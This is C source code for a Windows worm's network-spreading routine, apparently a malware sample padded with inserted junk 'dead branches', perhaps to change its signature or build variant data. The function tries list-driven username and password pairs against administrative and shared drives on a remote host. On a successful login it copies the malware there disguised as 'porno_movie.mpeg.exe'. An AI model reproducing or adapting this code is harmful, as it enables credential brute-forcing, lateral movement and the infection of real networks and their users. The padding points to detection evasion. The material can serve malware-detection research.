#include "data_globals.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>   // added for malloc/free

void _NetSpread(uint32_t param_1, LPCSTR param_2)
{
    NETRESOURCEA net_inf;
    char nb_remote[MAX_PATH];
    char *share_name[] = {"SharedDocs", "ADMIN$", "C$", "D$", "E$", "C", "D"};
    DWORD ret, share_cnt, users_cnt, pwd_cnt;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    for (share_cnt = 0; share_cnt < 7; share_cnt++)
    {
        for (users_cnt = 0; users_cnt < USERS_NUM; users_cnt++)
        {
            for (pwd_cnt = 0; pwd_cnt < PWD_NUM; pwd_cnt++)
            {
                // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
                if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
                    char *tmp = (char *)malloc(64);
                    if (tmp != NULL) {
                        strcpy(tmp, "dummy");
                        volatile DWORD len = strlen(tmp);
                        volatile BYTE check = 0;
                        for (volatile DWORD i = 0; i < len; i++) {
                            check ^= tmp[i];
                        }
                        volatile DWORD j = 0;
                        while (j < 2) {
                            check += j;
                            j++;
                        }
                        char tmp2[32];
                        memcpy(tmp2, tmp, 4);
                        volatile DWORD val = (DWORD)tmp2[0] + check;
                        val += len;
                        free(tmp);
                    }
                }

                memset(nb_remote, 0, MAX_PATH);
                sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);

                memset(&net_inf, 0, sizeof(net_inf));
                net_inf.dwDisplayType = RESOURCETYPE_ANY;
                net_inf.lpRemoteName = nb_remote;
                net_inf.lpLocalName = NULL;
                net_inf.lpProvider = NULL;

                ret = WNetAddConnection2A(&net_inf,
                                          passwords_list[pwd_cnt],
                                          users_list[users_cnt],
                                          0);

                if (ret == NO_ERROR)
                {
                    strcat(nb_remote, "\\porno_movie.mpeg.exe");
                    CopyFileA(param_2, nb_remote, FALSE);

                    memset(nb_remote, 0, MAX_PATH);
                    sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);
                    WNetCancelConnectionA(nb_remote, TRUE);
                }
            }
        }
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        memset(dummy_array, 0, sizeof(dummy_array));
    }
}
